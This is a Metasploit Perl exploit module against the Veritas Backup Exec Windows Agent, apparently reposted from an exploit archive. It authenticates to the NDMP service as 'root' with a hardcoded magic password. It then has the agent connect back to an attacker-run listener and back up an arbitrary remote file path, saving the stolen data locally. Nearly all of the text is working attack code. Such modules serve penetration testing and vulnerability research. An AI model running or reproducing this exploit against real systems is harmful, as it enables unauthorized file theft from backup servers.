Veritas Backup Exec Remote File Access Exploit (windows)
========================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

##
# Original code written by <CENSORED> and ported to the Framework by HDM
##

package Msf::Exploit::backupexec_dump;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use IO::Socket;
use IO::Select;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;  	=> &#039;Veritas Backup Exec Windows Remote File Access&#039;,
	&#039;Version&#039;  	=> &#039;$Revision: 1.3 $&#039;,
	&#039;Authors&#039; 	=> [ &#039;anonymous&#039; ],
	&#039;Arch&#039;  	=> [ ],
	&#039;OS&#039;    	=> [ ],

	&#039;UserOpts&#039;	=>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target IP address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target NDMP port&#039;, 10000],
		&#039;RPATH&#039; => [0, &#039;DATA&#039;, &#039;The remote file path to obtain&#039;],
		
		&#039;LHOST&#039; => [1, &#039;ADDR&#039;, &#039;The local IP address&#039;, &#039;0.0.0.0&#039;],
		&#039;LPORT&#039; => [1, &#039;PORT&#039;, &#039;The local listner port&#039;, 44444],
		&#039;LPATH&#039; => [0, &#039;DATA&#039;, &#039;The local backup file path&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
	This module abuses a logic flaw in the Backup Exec Windows Agent to download
arbitrary files from the system. This flaw was found by someone who wishes to
remain anonymous and affects all known versions of the Backup Exec Windows Agent. The 
output file is in &#039;MTF&#039; format, which can be extracted by the &#039;NTKBUp&#039; program 
listed in the references section.
}),

	&#039;Refs&#039; =>
	  [
	  	[&#039;BID&#039;, &#039;14551&#039;],
		[&#039;URL&#039;, &#039;http://www.fpns.net/willy/msbksrc.lzh&#039;],
		# [&#039;URL&#039;, &#039;http://metasploit.com/tools/msbksrc.tar.gz&#039;],
	  ],

	&#039;DefaultTarget&#039; => 0,
	&#039;Targets&#039; =>
	  [
		[&#039;Veritas Remote File Access&#039;],
	  ],

	&#039;Keys&#039; => [&#039;veritas&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Check {
	my $self        = shift;
	my $remote_host = $self->GetVar(&#039;RHOST&#039;);
	my $remote_port = $self->GetVar(&#039;RPORT&#039;);

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039;  => $remote_host,
		&#039;PeerPort&#039;  => $remote_port,
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( &#039;[*] Error connecting to Veritas agent: &#039; . $s->GetError );
		return $self->CheckCode(&#039;Connect&#039;);
	}

	my $res;
	my $pkt;
	
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine(&#039;[*] Did not receive greeting from the agent&#039;);
		$s->Close;
		return $self->CheckCode(&#039;Unknown&#039;);
	}

	my $username = "root";
	my $password = "\xb4\xb8\x0f\x26\x20\x5c\x42\x34\x03\xfc\xae\xee\x8f\x91\x3d\x6f"; 

	# Create the CONNECT_CLIENT_AUTH request
	$pkt =
	  pack(&#039;N&#039;, 1).
	  pack(&#039;N&#039;, time()).
	  pack(&#039;N&#039;, 0).
	  pack(&#039;N&#039;, 0x0901).
	  pack(&#039;N&#039;, 0).
	  pack(&#039;N&#039;, 0).
	  pack(&#039;N&#039;, 2).
	  pack(&#039;N&#039;, length($username)).
	  $username.
	  $password;

	$self->PrintLine( "[*] Sending magic authentication request...");
	
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	$s->Close;
	
	if (! $res) {
		$self->PrintLine(&#039;[*] Did not receive authentication response&#039;);
		return $self->CheckCode(&#039;Safe&#039;);	
	}

	my @words = unpack(&#039;N*&#039;, $res);
	
	if (
		$words[2] == 1 && 
		$words[3] == 0x0901 &&
	 	$words[5] == 0 &&
	  	$words[6] == 0
	   ) {
		$self->PrintLine(&#039;[*] This system appears to be vulnerable&#039;);
		return $self->CheckCode(&#039;Appears&#039;);
	}
	
	$self->PrintLine(&#039;[*] This system does not appear to be vulnerable&#039;);
	return $self->CheckCode(&#039;Safe&#039;);
}

sub Exploit {
	my $self        = shift;
	my $remote_host = $self->GetVar(&#039;RHOST&#039;);
	my $remote_port = $self->GetVar(&#039;RPORT&#039;);
	my $remote_path = $self->GetVar(&#039;RPATH&#039;);

	my $local_host  = $self->GetVar(&#039;LHOST&#039;);
	my $local_port  = $self->GetVar(&#039;LPORT&#039;);
	my $local_path  = $self->GetVar(&#039;LPATH&#039;);
	
	
	if (! $local_path) {
		$self->PrintLine("[*] Please specify a local file name for the LPATH option");
		return;
	}

	if (! $remote_path) {
		$self->PrintLine("[*] Please specify a remote file path for the RPATH option");
		return;
	}
		
	$self->PrintLine( "[*] Attempting to retrieve $remote_path...");

	my $s = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039;  => $remote_host,
		&#039;PeerPort&#039;  => $remote_port,
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );

	if ( $s->IsError ) {
		$self->PrintLine( &#039;[*] Error connecting to Veritas agent: &#039; . $s->GetError );
		return;
	}

	my $res;
	my $pkt;
	
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine(&#039;[*] Did not receive greeting from the agent&#039;);
		$s->Close;
		return;
	}

	my $username = "root";
	my $password = "\xb4\xb8\x0f\x26\x20\x5c\x42\x34\x03\xfc\xae\xee\x8f\x91\x3d\x6f"; 

	# Create the CONNECT_CLIENT_AUTH request
	$pkt =
	  pack(&#039;N&#039;, 1).
	  pack(&#039;N&#039;, time()).
	  pack(&#039;N&#039;, 0).
	  pack(&#039;N&#039;, 0x0901).
	  pack(&#039;N&#039;, 0).
	  pack(&#039;N&#039;, 0).
	  pack(&#039;N&#039;, 2).
	  pack(&#039;N&#039;, length($username)).
	  $username.
	  $password;

	$self->PrintLine( "[*] Sending magic authentication request...");
	
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine(&#039;[*] Did not receive authentication response&#039;);
		return;
	}

	$self->PrintLine("[*] Starting the data connection listener on $local_port...");
	my $l = IO::Socket::INET->new
	  (
		&#039;LocalPort&#039; => $local_port,
		&#039;Proto&#039;     => &#039;tcp&#039;,
		&#039;ReuseAddr&#039; => 1,
		&#039;Listen&#039;    => 5,
		&#039;Blocking&#039;  => 0,
	  );
	
	if (! $l) {
		$self->PrintLine("[*] Failed to start the listener: $!");
		return;
	}
	
	my $sel = IO::Select->new($l);
	
	if ($local_host eq "0.0.0.0") {
		$local_host = $s->Socket->sockhost;
	}
	
	# Create the DATA_CONNECT request
	$pkt =
		pack(&#039;NNNNNNN&#039;,
			3,
			0,
			0,
			0x040a,
			0,
			0,
			1
		).
		gethostbyname($local_host).
		pack(&#039;N&#039;, $local_port);
		
	$self->PrintLine("[*] Directing the server to $local_host:$local_port...");
	
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine(&#039;[*] Did not receive data connect response&#039;);
		return;
	}

	$self->PrintLine("[*] Waiting 15 seconds for the agent to connect...");
	my @rdy = $sel->can_read(15);
	if (! @rdy) {
		$self->PrintLine("[*] No connection received from the agent :-(");
		return;
	}
	
	my $cli = $l->accept();
	if (! $cli) {
		$self->PrintLine("[*] Encountered an error accepting the connection: $!");
		return;
	}
	
	my $d = Msf::Socket::Tcp->new_from_socket($cli);
	
	$self->PrintLine("[*] Connection received from ".$d->PeerAddr." :-)");
	
	# Create the MOVER_SET_RECORD_SIZE request
	$pkt= 
		pack(&#039;NNNNNNN&#039;,
			4,
			0,
			0,
			0x0a08,
			0,
			0,
			0x8000,
		);
		
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine(&#039;[*] Did not receive mover set response&#039;);
		return;
	}

	# The environment needed to perform the actual backup
	my %define_env =
	(
		&#039;USERNAME&#039;                => &#039;&#039;,
		&#039;BU_EXCLUDE_ACTIVE_FILES&#039; => "0",
		&#039;FILESYSTEM&#039;              => "\"\\\\$remote_host\\$remote_path\",v0,t0,l0,n0,f0",
	);

	# Create the DATA_START_BACKUP request
	$pkt =
		pack(&#039;NNNNNNN&#039;,
			5,
			0,
			0,
			0x0401,
			0,
			0,
			4,
		).
		"dump".
		pack("N", scalar(keys %define_env));
	
	foreach my $var (keys %define_env) {
		
		$pkt .= pack("N", length($var));
		$pkt .= $var;
		if (length($var) % 4) {
			$pkt .= "\x00" x (4 - (length($var) % 4));
		}
		
		$pkt .= pack("N", length($define_env{$var}));
		$pkt .= $define_env{$var};
		if (length($define_env{$var}) % 4) {
			$pkt .= "\x00" x (4 - (length($define_env{$var}) % 4));
		}
	}	

	substr($pkt, -1, 1) = "\x01";
	
	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine(&#039;[*] Did not receive backup start response&#039;);
		return;
	}

	# Create the GET_ENV request
	$pkt =
		pack(&#039;NNNNNN&#039;,
			5,
			0,
			0,
			0x4004,
			0,
			0,
		);

	$self->AgentSend($s, $pkt);
	$res = $self->AgentRead($s);
	if (! $res) {
		$self->PrintLine(&#039;[*] Did not receive get env response&#039;);
		return;
	}

	if (! open(TMP, ">". $local_path)) {
		$self->PrintLine("[*] Could not open local file for writing: $!");
		return;
	}
	
	my $data;
	do 
	{
		$data = $d->Recv(524288, 10);
		if ($data) {
			$self->PrintLine("[*] Obtained ".length($data)." bytes from the agent");
			print TMP $data;
		}
		else {
			$self->PrintLine("[*] Reached the end of the backup data");
		}
		
	} while ($data);
	close(TMP);
			
	return;
};

sub AgentRead {
	my $self = shift;
	my $sock = shift;
	my $rlen = $sock->Recv(4, 10);
	return if ! $rlen;
	
	my $plen = unpack(&#039;N&#039;, $rlen);
	return if ! $plen;
	
	my $data = $sock->Recv($plen & 0x7fffffff, 10);
	return $data;
}

sub AgentSend {
	my $self = shift;
	my $sock = shift;
	my $data = shift;
	return if ! $data;
	return $sock->Send(pack(&#039;N&#039;, 0x80000000 + length($data)) . $data);
}

1;


